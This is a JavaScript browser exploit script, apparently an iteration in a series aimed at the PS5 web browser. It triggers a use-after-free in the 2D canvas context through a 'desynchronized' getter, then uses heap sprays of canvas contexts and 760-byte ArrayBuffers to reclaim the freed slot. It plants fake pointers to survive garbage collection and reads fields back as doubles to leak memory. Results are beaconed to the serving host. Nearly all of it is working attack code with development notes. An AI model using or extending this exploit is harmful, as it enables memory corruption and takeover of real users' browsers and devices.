// p483 — Canvas UAF: re-free aliased slot + type confusion spray
//
// V482 CONFIRMED: same-type spray works, aliasIdx=10, bidir R/W OK
//   BUT same-type spray can't leak addresses — all values are normal canvas defaults
//
// Strategy:
//   1. Trigger UAF (desynchronized getter) → danglingCtx points to freed C1
//   2. Same-type spray → find aliased index (which spray ctx occupies C1's slot)
//   3. RE-FREE the aliased slot by destroying spray[aliasedIdx]'s canvas
//      → The CanvasRenderingContext2D held by that canvas is freed
//      → The slot is FREE again
//   4. Spray ArrayBuffer(760) backing stores into the 768B slot
//      → AB backing stores have controlled bytes at all offsets
//      → Put a valid-looking pointer at +32 (m_canvas offset) to survive GC
//   5. Read through danglingCtx → doubles at lineWidth/globalAlpha/transform offsets
//      now read from our controlled AB data → type confusion confirmed
//   6. If confirmed, try reading pointer-containing offsets as doubles → info leak
//
// GC concern: After re-free, danglingCtx's C++ object is freed.
//   visitAdditionalChildren reads m_canvas at +32.
//   We need to spray BEFORE GC runs and ensure +32 has a valid-looking pointer.
//   Using the triggerCanvas element address (still in DOM) could work if we knew it.
//   Alternative: use a big non-zero value that's in a plausible address range.
//   Safest: do spray immediately, no GC triggers in between.
//
// Beacon prefix: V483-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V483-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Trigger UAF via desynchronized getter
  // ═══════════════════════════════════════════════════════════
  var danglingCtx = null;
  var liveCtx = null;
  var triggerCanvas = document.createElement('canvas');
  triggerCanvas.width = 10;
  triggerCanvas.height = 10;
  document.body.appendChild(triggerCanvas);

  var callCount = 0;
  var settings = {};
  Object.defineProperty(settings, 'desynchronized', {
    get: function() {
      callCount++;
      if (callCount === 1) {
        danglingCtx = triggerCanvas.getContext('2d');
      }
      return false;
    }
  });

  liveCtx = triggerCanvas.getContext('2d', settings);

  if (!danglingCtx || danglingCtx === liveCtx) {
    B('ABORT', 'no-alias:d=' + !!danglingCtx + ',same=' + (danglingCtx === liveCtx));
    return;
  }
  B('ALIAS', 'YES,calls=' + callCount);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Same-type spray to occupy the freed slot
  // ═══════════════════════════════════════════════════════════
  var N_SPRAY = 200;
  var sprayCanvases = [];
  var sprayCtxs = [];
  for (var i = 0; i < N_SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10;
    c.height = 10;
    sprayCanvases.push(c);
    sprayCtxs.push(c.getContext('2d'));
  }
  B('SPRAY', N_SPRAY + ' contexts');

  for (var i = 0; i < sprayCtxs.length; i++) {
    sprayCtxs[i].lineWidth = 100 + i;
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Identify aliased slot
  // ═══════════════════════════════════════════════════════════
  var lw;
  try {
    lw = danglingCtx.lineWidth;
  } catch(e) {
    B('READ-ERR', e.message);
    B('DONE');
    return;
  }

  if (typeof lw !== 'number' || lw < 100 || lw >= 100 + N_SPRAY) {
    B('NO-ALIAS', 'lw=' + lw);
    B('DONE');
    return;
  }

  var aliasedIdx = Math.round(lw - 100);
  B('ALIASED', 'idx=' + aliasedIdx);

  // Quick bidir check
  danglingCtx.lineWidth = 999.5;
  var check = sprayCtxs[aliasedIdx].lineWidth;
  if (check !== 999.5) {
    B('BIDIR-FAIL', 'wrote=999.5,read=' + check);
    B('DONE');
    return;
  }
  B('BIDIR', 'OK');

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: RE-FREE the aliased slot
  //
  // The spray canvas at aliasedIdx owns the context via unique_ptr.
  // Destroying the canvas should free the context, leaving the
  // 768B slot available again.
  //
  // Method: Replace canvas's context by requesting a different
  // context type. getContext('webgl') would replace m_context,
  // freeing the 2D context. But PS5 has no WebGL.
  //
  // Alternative: Remove canvas from DOM + null all refs → GC
  // collects the canvas → destructor frees m_context.
  //
  // But we can't trigger GC safely (danglingCtx is dangling).
  //
  // Best approach: Use getContext() trick on the SAME canvas
  // to replace the context. On PS5, only '2d' works.
  // Actually, getContext() returns existing context if same type.
  //
  // Real approach: null the JS refs and let natural GC handle it,
  // but spray ABs FIRST to fill the slot before GC reads +32.
  //
  // Actually — simplest: just null the canvas element's innerHTML
  // and the JS references, then spray immediately. The 768B slot
  // won't actually be freed until GC, but... we need it freed first.
  //
  // Let's try: remove canvas from DOM + replace with a tiny canvas
  // that triggers context replacement.
  //
  // CRITICAL INSIGHT: We can't reliably re-free with same type.
  // Instead: use a SECOND UAF trigger on a different canvas to
  // get a dangling pointer to a slot we then spray with ABs.
  //
  // OR: accept that same-type spray can't leak, and use a
  // DIFFERENT approach entirely:
  //
  // APPROACH A: Use save()/restore() manipulation:
  //   - Call save() many times on spray[aliasedIdx] to grow stateStack
  //   - m_buffer becomes a heap pointer stored in the object body
  //   - The heap address of the state buffer IS an info leak
  //   - Read it through danglingCtx by... hmm, still same memory
  //
  // APPROACH B: Spray different-type objects of 768B from the START:
  //   - Don't do same-type spray at all
  //   - After UAF, spray objects that have valid ptr at +32
  //   - Read through danglingCtx
  //   - But what 768B objects have valid +32?
  //
  // APPROACH C: Two-stage — same-type spray to confirm, then
  //   re-trigger UAF to get a SECOND dangling ptr, spray ABs
  //   between the two getContext() calls, timing to fill slot
  //   before GC runs visitAdditionalChildren.
  //
  // Let's try APPROACH C: We know the UAF works. On second trigger,
  // we immediately spray 768B ABs. If an AB fills the slot before
  // GC scans, +32 might have non-null data and survive.
  // ═══════════════════════════════════════════════════════════

  B('PHASE4', 'second-uaf-trigger');

  // Pre-allocate AB spray buffers (768B each, pattern-filled)
  // Fill with a distinctive pattern: every 8 bytes gets a pointer-like value
  // that's in kernel address space (high bits set) to survive GC.
  // Offset +32 (m_canvas) must look like a valid pointer.
  var AB_SIZE = 760;  // 760B → 768B FastMalloc bucket (8B header)
  var N_AB = 400;
  var abSpray = [];
  var viewSpray = [];

  // Pre-create buffers but don't fill yet
  for (var i = 0; i < N_AB; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    abSpray.push(ab);
    viewSpray.push(new Float64Array(ab));
  }
  B('AB-READY', N_AB + ' buffers of ' + AB_SIZE + 'B');

  // Second UAF trigger on a fresh canvas
  var triggerCanvas2 = document.createElement('canvas');
  triggerCanvas2.width = 10;
  triggerCanvas2.height = 10;
  document.body.appendChild(triggerCanvas2);

  var danglingCtx2 = null;
  var liveCtx2 = null;
  var callCount2 = 0;
  var settings2 = {};

  // Fill AB spray buffers NOW, right before the UAF trigger
  // Pattern: sentinel value 0x4141414141414141 at every double slot
  // EXCEPT position 4 (bytes 32-39 = m_canvas offset) gets a
  // plausible heap address. We use the address of triggerCanvas2's
  // element as a guess, but we don't know it. Instead, use a
  // non-null value that won't crash if dereferenced by GC.
  // The safest bet: fill with the float64 encoding of a sentinel.
  for (var i = 0; i < N_AB; i++) {
    var view = viewSpray[i];
    // Fill with unique sentinel per AB at position 0
    view[0] = 13370000 + i;  // vtable-ish offset 0
    view[1] = 13380000 + i;  // m_wrapper offset 8
    view[2] = 13390000 + i;  // weakptr offset 16
    view[3] = 13400000 + i;  // checkedptr+bool offset 24
    // offset 32-39: m_canvas — CRITICAL: must look like valid ptr
    // Let's try 0x0000000100000000 — a plausible low heap address
    // as Float64: use DataView for exact bit pattern
    var dv = new DataView(abSpray[i]);
    // Write a plausible pointer at byte 32: 0x0000000800000000
    // (8GB mark — plausible for PS5 heap in user address space)
    dv.setUint32(32, 0x00000000, true); // low 32 bits
    dv.setUint32(36, 0x00000008, true); // high 32 bits = 0x800000000
    // Rest: fill with AB index encoded as sentinels at key offsets
    // Offset 40+: secondary vtable area
    for (var j = 5; j < view.length; j++) {
      view[j] = i + j * 0.001;  // unique per AB + per offset
    }
  }
  B('AB-FILLED', 'pattern at +32');

  Object.defineProperty(settings2, 'desynchronized', {
    get: function() {
      callCount2++;
      if (callCount2 === 1) {
        danglingCtx2 = triggerCanvas2.getContext('2d');
        // IMMEDIATELY after inner getContext creates C1_2,
        // outer will create C2_2 which frees C1_2.
        // Can't spray here — still inside the getter.
      }
      return false;
    }
  });

  // This triggers: getter fires → C1_2 created → outer creates C2_2 → C1_2 FREED
  liveCtx2 = triggerCanvas2.getContext('2d', settings2);

  if (!danglingCtx2) {
    B('UAF2-FAIL', 'no ctx2');
    B('DONE');
    return;
  }
  B('UAF2', 'calls=' + callCount2);

  // C1_2's 768B slot is now FREE. Spray to reclaim it.
  // The AB backing stores are already allocated, but they went to
  // the allocator BEFORE the free. We need NEW allocations to fill
  // the just-freed slot.
  //
  // Reallocate a fresh batch of 768B ABs RIGHT NOW:
  var abSpray2 = [];
  var viewSpray2 = [];
  for (var i = 0; i < N_AB; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    abSpray2.push(ab);
    var dv = new DataView(ab);
    // Sentinel at byte 0: unique per AB
    dv.setFloat64(0, 42420000 + i, false);
    // m_canvas at +32: plausible pointer to survive GC
    dv.setUint32(32, 0x00000000, true);
    dv.setUint32(36, 0x00000008, true);
    // lineWidth area — we don't know exact offset yet
    // Fill every 8-byte slot from 96 onward with AB index
    for (var j = 96; j + 8 <= AB_SIZE; j += 8) {
      dv.setFloat64(j, i + (j / 8) * 0.0001, false);
    }
    viewSpray2.push(new Float64Array(ab));
  }
  B('AB-SPRAY2', N_AB + ' fresh 768B ABs');

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: Read through danglingCtx2 — type confusion!
  // If an AB backing store landed in C1_2's slot, we should read
  // our sentinel values instead of normal canvas defaults.
  // ═══════════════════════════════════════════════════════════
  var tc = {};
  try {
    tc.lineWidth = danglingCtx2.lineWidth;
    tc.globalAlpha = danglingCtx2.globalAlpha;
    tc.miterLimit = danglingCtx2.miterLimit;
    tc.shadowBlur = danglingCtx2.shadowBlur;
    tc.shadowOffsetX = danglingCtx2.shadowOffsetX;
    tc.shadowOffsetY = danglingCtx2.shadowOffsetY;
    tc.lineDashOffset = danglingCtx2.lineDashOffset;
    tc.ok = true;
  } catch(e) {
    tc.error = e.message;
    tc.ok = false;
  }

  B('TC-READ', JSON.stringify(tc));

  // Check if any values are our sentinels (not default canvas values)
  var defaults = {lineWidth: 1, globalAlpha: 1, miterLimit: 10,
                  shadowBlur: 0, shadowOffsetX: 0, shadowOffsetY: 0, lineDashOffset: 0};
  var corrupted = [];
  for (var k in defaults) {
    if (tc[k] !== undefined && tc[k] !== defaults[k]) {
      corrupted.push(k + '=' + tc[k]);
    }
  }
  B('TC-DIFF', corrupted.length > 0 ? corrupted.join(',') : 'all-defaults');

  // Also try getTransform — returns 6 doubles from the AffineTransform
  var transform = null;
  try {
    var m = danglingCtx2.getTransform();
    transform = {a: m.a, b: m.b, c: m.c, d: m.d, e: m.e, f: m.f};
  } catch(e) {
    transform = {error: e.message};
  }
  B('TC-TRANSFORM', JSON.stringify(transform));

  // Try to identify which AB landed in the slot
  // Write unique values through danglingCtx2, then scan ABs
  if (tc.ok && corrupted.length > 0) {
    B('TC-CONFIRMED', 'type confusion active!');

    // Write sentinel through dangling
    try {
      danglingCtx2.lineWidth = 31337.75;
    } catch(e) {
      B('TC-WRITE-ERR', e.message);
    }

    // Scan AB spray for the sentinel
    var foundAB = -1;
    for (var i = 0; i < abSpray2.length; i++) {
      var view = new Float64Array(abSpray2[i]);
      for (var j = 0; j < view.length; j++) {
        if (view[j] === 31337.75) {
          foundAB = i;
          B('TC-FOUND', 'AB=' + i + ',offset=' + (j * 8) + 'B');
          break;
        }
      }
      if (foundAB >= 0) break;
    }

    if (foundAB < 0) {
      B('TC-NOTFOUND', 'sentinel not in AB spray');
    }
  } else if (tc.ok) {
    // Values are all defaults — either no AB landed, or the AB data
    // at the state offset happens to match defaults, or we're still
    // reading from a real context (state stack indirection)
    B('TC-NOCHANGE', 'defaults - checking if state indirection blocks us');

    // The state stack indirection means:
    // danglingCtx2 reads m_stateStack.m_buffer[m_size-1].field
    // If m_buffer at the vector offset in the fake object points
    // somewhere valid, we read from THAT address, not from the AB directly.
    // If m_buffer is 0 or garbage, we'd crash.
    // The fact we got defaults without crashing means something interesting:
    // either a real context is in the slot, or m_buffer points to valid memory
    // with default-looking values.

    // Try writing through dangling to see if it crashes
    try {
      danglingCtx2.lineWidth = 98765.4321;
      var readBack = danglingCtx2.lineWidth;
      B('TC-WRITE', 'wrote=98765.4321,readback=' + readBack);
    } catch(e) {
      B('TC-WRITE-CRASH', e.message);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 6: Try to read pointer-like values through float64
  // Even if type confusion didn't obviously work, try reading
  // values that might be addresses
  // ═══════════════════════════════════════════════════════════
  try {
    var hexDump = [];
    // Read all doubles we can from dangling2
    var props = ['lineWidth', 'globalAlpha', 'miterLimit',
                 'shadowBlur', 'shadowOffsetX', 'shadowOffsetY', 'lineDashOffset'];
    for (var i = 0; i < props.length; i++) {
      var val = danglingCtx2[props[i]];
      // Convert double to hex for analysis
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = val;
      var bytes = new Uint8Array(buf);
      var hex = '';
      for (var b = 7; b >= 0; b--) {
        hex += ('0' + bytes[b].toString(16)).slice(-2);
      }
      hexDump.push(props[i] + ':0x' + hex + '=' + val);
    }
    B('HEX-DUMP', hexDump.join('|'));
  } catch(e) {
    B('HEX-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // Keep original same-type alias alive for reference
  // ═══════════════════════════════════════════════════════════
  B('SUMMARY', 'uaf1_idx=' + aliasedIdx + ',uaf2_tc=' + corrupted.length + '_diffs');
  B('DONE');
})();
